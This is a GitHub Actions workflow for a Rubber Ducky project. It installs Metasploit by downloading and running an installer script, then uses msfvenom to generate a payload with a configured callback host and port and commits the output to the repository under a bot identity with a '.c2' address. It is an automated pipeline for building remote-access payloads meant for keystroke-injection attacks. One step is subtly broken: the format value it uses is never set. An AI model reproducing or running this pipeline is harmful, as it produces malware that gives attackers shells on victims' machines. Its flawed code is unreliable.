name: Generate Payload

on:
  push:
    paths:
      - 'Rubber_Ducky/config/payload_config.json'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Read Configuration
        id: config
        run: |
          CONFIG=$(cat Rubber_Ducky/config/payload_config.json)
          echo "PAYLOAD=$(echo $CONFIG | jq -r .payload)" >> $GITHUB_OUTPUT
          echo "LHOST=$(echo $CONFIG | jq -r .lhost)" >> $GITHUB_OUTPUT
          echo "LPORT=$(echo $CONFIG | jq -r .lport)" >> $GITHUB_OUTPUT
      - name: Install Metasploit (Native)
        run: |
          echo "Downloading Metasploit installer..."
          curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
          chmod 755 msfinstall
          
          echo "Installing..."
          ./msfinstall
          
          # Verify install
          which msfvenom
          msfvenom --version

      - name: Generate Payload
        run: |
          mkdir -p Rubber_Ducky/payloads
          
          PAYLOAD="${{ steps.config.outputs.PAYLOAD }}"
          LHOST="${{ steps.config.outputs.LHOST }}"
          LPORT="${{ steps.config.outputs.LPORT }}"
          FORMAT="${{ steps.config.outputs.FORMAT }}"
          OUTFILE="Rubber_Ducky/payloads/payload.${FORMAT}"
          
          echo "Generating $PAYLOAD to $OUTFILE..."
          
          msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -o "$OUTFILE"
          
          # Verify generation
          if [ -f "$OUTFILE" ]; then
            echo "SUCCESS: Payload generated at $OUTFILE"
            ls -l "$OUTFILE"
          else
            echo "ERROR: Payload file was NOT created!"
            exit 1
          fi

      - name: Commit and Push
        run: |
          git config --global user.name 'Ducky Bot'
          git config --global user.email 'bot@ducky.c2'
          git pull
          git add Rubber_Ducky/payloads/
          
          # Check if there are changes to commit
          if git diff --staged --quiet; then
            echo "No changes to commit (File might be identical to previous version)"
          else
            git commit -m "Generated payload: ${{ steps.config.outputs.PAYLOAD }}"
            git push
          fi
